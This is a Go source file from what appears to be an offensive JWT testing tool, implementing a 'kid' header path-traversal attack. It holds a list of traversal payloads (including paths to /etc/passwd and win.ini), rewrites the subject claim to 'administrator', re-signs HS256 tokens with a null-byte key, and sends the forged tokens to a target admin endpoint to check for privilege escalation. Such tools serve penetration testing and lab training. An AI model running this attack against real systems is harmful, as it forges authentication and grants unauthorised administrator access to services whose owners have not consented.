package jwt

import (
	"encoding/base64"
	"fmt"

	jwtlib "github.com/golang-jwt/jwt/v5"

	"github.com/spencer5cent/jwtknife/internal/httpx"
	"github.com/spencer5cent/jwtknife/internal/jwtknifejwt"
	"github.com/spencer5cent/jwtknife/internal/report"
)

var autoKidPaths = []string{
	"../../../../../../../dev/null",
	"../../../../../../../etc/passwd",
	"..\\..\\..\\..\\..\\..\\..\\NUL",
	"..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
	"../key",
	"../../key",
	"/dev/null",
}

type kidTraversal struct{}

func NewKidTraversalAttack() Attack { return kidTraversal{} }

func (kidTraversal) Name() string {
	return "kid path traversal (filesystem key lookup)"
}

func (kidTraversal) Run(in AttackInput) report.AttackResult {
	ar := report.NewAttackResult("kid-traversal")

	if !in.ParsedJWT.HasKid {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "no kid header present"
		return ar
	}

	// Decide payloads
	var payloads []string
	if in.CustomKID != "" {
		payloads = []string{in.CustomKID}
		ar.Note = "custom kid value used"
	} else {
		payloads = autoKidPaths
	}

	for _, kidVal := range payloads {
		p, err := jwtknifejwt.Parse(in.RawJWT)
		if err != nil {
			ar.Errors = append(ar.Errors, err.Error())
			continue
		}

		p.Header["kid"] = kidVal
		p.Payload["sub"] = "administrator"

		var mod string

		// Lab-style HS256 resign using null-byte secret
		if p.Alg == "HS256" {
			secret, _ := base64.StdEncoding.DecodeString("AA==")
			tok := jwtlib.NewWithClaims(jwtlib.SigningMethodHS256, jwtlib.MapClaims(p.Payload))
			for k, v := range p.Header {
				tok.Header[k] = v
			}
			mod, err = tok.SignedString(secret)
		} else {
			mod, err = jwtknifejwt.Rebuild(p)
		}

		if err != nil {
			ar.Errors = append(ar.Errors, err.Error())
			continue
		}

		step := report.Step{
			Label:   "kid-traversal",
			Details: fmt.Sprintf("kid=%s", kidVal),
			JWT:     report.JWTInfo{Token: mod},
		}

		if in.Client != nil && in.Targets.AdminURL != "" {
			r := in.Client.Do(httpx.RequestPlan{
				Label:     "atk-kid-traversal",
				URL:       in.Targets.AdminURL,
				Method:    in.Targets.Method,
				JWT:       mod,
				Placement: in.Targets.Placement,
			})
			step.HTTP = report.FromHTTPResult(r)

			if report.IsAdminSuccess(in.Baseline, step.HTTP) {
				ar.Steps = append(ar.Steps, step)
				ar.Outcome = report.OutcomeSuccess
				ar.Note = "admin access achieved via kid path traversal (token is NOT reusable; exploit relies on filesystem key lookup side-effect)"
				return ar
			}
			if report.IsInteresting(in.Baseline, step.HTTP) {
				ar.Outcome = report.OutcomeInteresting
			}
		}

		ar.Steps = append(ar.Steps, step)
	}

	if ar.Outcome == "" {
		ar.Outcome = report.OutcomeNoEffect
	}
	return ar
}

func mutateHeaderOnly(raw, key string, val any) (string, error) {
	p, err := jwtknifejwt.Parse(raw)
	if err != nil {
		return "", err
	}
	p.Header[key] = val
	return jwtknifejwt.Rebuild(p)
}
